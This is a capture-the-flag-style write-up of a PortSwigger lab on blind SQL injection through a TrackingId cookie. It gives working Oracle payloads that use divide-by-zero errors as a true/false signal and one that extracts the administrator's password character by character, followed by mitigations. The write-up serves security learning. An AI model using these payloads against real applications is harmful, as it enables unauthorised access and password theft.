# Blind SQL injection with conditional errors
---
## TARGET
PortSwigger Web Security Academy  
Lab: _Blind SQL injection with conditional errors_

---
## DESCRIPTION
The application uses a tracking cookie for analytics. The application is vulnerable to Blind SQL Injection. Unlike previous labs, the application **does not** display different content (like "Welcome back") based on the query result. However, it handles SQL errors differently: if a query causes a database error, the application returns a generic "Internal Server Error" (HTTP 500). If the query is valid, it returns HTTP 200

---
## ROOT CAUSE
The `TrackingId` cookie is used in a SQL query without sanitization. The application suppresses data output but fails to handle database errors gracefully, allowing an attacker to use **conditional errors** as a boolean side-channel.

---
## ATTACK SCENARIO
1. **Injection Verification:** The attacker adds a single quote `'` to the cookie. The server returns HTTP 500 (Internal Server Error), indicating a syntax error broke the query.
2. **Database Identification:** The attacker successfully repairs the query using Oracle syntax (`||` concatenation and `FROM dual`), confirming the database is Oracle.
    - Payload: `' || (SELECT '' FROM dual) || '` (Returns HTTP 200).
3. **Boolean Logic (The "Crash" Switch):** The attacker forces a conditional error (Divide By Zero) to test logic.
    - **Test True:** "If 1=1, Divide by Zero." -> **CRASH (HTTP 500)**.
    - **Test False:** "If 1=2, Divide by Zero." -> **NORMAL (HTTP 200)**.    
4. **Data Extraction:** The attacker iterates through the administrator's password.
    - Query: "If the first letter is 'a', Divide by Zero."
    - Result: HTTP 500 -> The letter is 'a'.  
    - Result: HTTP 200 -> The letter is NOT 'a'.

---
## PROOF OF CONCEPT
### Injection Point
- **Header:** `Cookie: TrackingId=...`
- **Context:** Oracle SQL (Blind)

### Payload Used(Oracle)
- True Condition (Triggers Error 500):
```SQL
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
```
- False Condition (Returns 200 OK):
```SQL
' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
```
- Password Extraction:
```SQL
' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```
### Result
- **HTTP 500** = **TRUE** (We found the character).
- **HTTP 200** = **FALSE** (Wrong character).

---
## IMPACT
An attacker can extract sensitive data (passwords, user details) byte-by-byte by observing the server's HTTP status codes.

---
## FIX / MITIGATION
- **Parameterized Queries:** Prevent the injection entirely.
- **Generic Error Handling:** Ensure the application returns the exact same response (HTTP 200 or a generic 500) regardless of whether a database syntax error or logic error occurred. Never let the database state influence the HTTP status code directly.

---
## KEY LEARNING
- When an application suppresses data output ("Welcome back"), we look for **Metadata Leaks** (Status Codes, Response Times).
- **Conditional Errors:** We intentionally try to break the database (e.g., Divide by Zero `1/0`) to confirm a True condition.
- **Inverted Logic:** In this specific scenario, a "Broken" page (Error 500) is a **Good** result (Success), while a "Working" page is a Failure.

---
